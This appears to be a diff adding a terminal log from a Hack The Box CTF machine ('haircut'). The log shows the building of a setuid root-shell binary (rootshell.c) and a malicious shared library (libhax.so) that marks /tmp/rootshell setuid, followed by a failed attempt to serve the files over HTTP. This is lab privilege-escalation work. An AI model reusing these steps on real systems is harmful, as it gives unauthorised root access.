@@ -1,0 +1,52 @@
+┌─[root@parrot]─[~/hackthebox/haircut] 
+└──╼ #vi rootshell.c                   
+┌─[root@parrot]─[~/hackthebox/haircut] 
+└──╼ #vi libhax.c                      
+┌─[root@parrot]─[~/hackthebox/haircut] 
+└──╼ #ls                               
+libhax.c  nmap  rootshell.c  shell.sh  www                                     
+┌─[root@parrot]─[~/hackthebox/haircut] 
+└──╼ #gcc -o rootshell rootshell.c     
+rootshell.c: In function ‘main’:       
+rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]                                                          
+    3 |     setuid(0);                 
+      |     ^~~~~~                     
+rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]                                                          
+    4 |     setgid(0);                 
+      |     ^~~~~~                     
+rootshell.c:5:5: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]                                                          
+    5 |     system("/bin/sh");         
+      |     ^~~~~~                     
+┌─[root@parrot]─[~/hackthebox/haircut] 
+└──╼ #gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c                   
+gcc: error: /tmp/libhax.c: No such file or directory                           
+┌─[✗]─[root@parrot]─[~/hackthebox/haircut]                                     
+└──╼ #gcc -fPIC -shared -ldl -o libhax.so libhax.c                                                                                                             
+libhax.c: In function ‘dropshell’:     
+libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]                                                              
+    7 |     chmod("/tmp/rootshell", 04755);                                    
+      |     ^~~~~                      
+┌─[root@parrot]─[~/hackthebox/haircut] 
+└──╼ #python -m SimpleHTTPServer       
+Traceback (most recent call last):     
+  File "/usr/lib/python2.7/runpy.py", line 174, in _run_module_as_main         
+    "__main__", fname, loader, pkg_name)                                       
+  File "/usr/lib/python2.7/runpy.py", line 72, in _run_code                    
+    exec code in run_globals           
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 235, in <module>         
+    test()                             
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 231, in test             
+    BaseHTTPServer.test(HandlerClass, ServerClass)                             
+  File "/usr/lib/python2.7/BaseHTTPServer.py", line 606, in test               
+    httpd = ServerClass(server_address, HandlerClass)                          
+  File "/usr/lib/python2.7/SocketServer.py", line 420, in __init__             
+    self.server_bind()                 
+  File "/usr/lib/python2.7/BaseHTTPServer.py", line 108, in server_bind        
+    SocketServer.TCPServer.server_bind(self)                                   
+  File "/usr/lib/python2.7/SocketServer.py", line 434, in server_bind          
+    self.socket.bind(self.server_address)                                      
+  File "/usr/lib/python2.7/socket.py", line 228, in meth                       
+    return getattr(self._sock,name)(*args)                                     
+socket.error: [Errno 98] Address already in use                                
+┌─[✗]─[root@parrot]─[~/hackthebox/haircut]                                     
+└──╼ #                                 
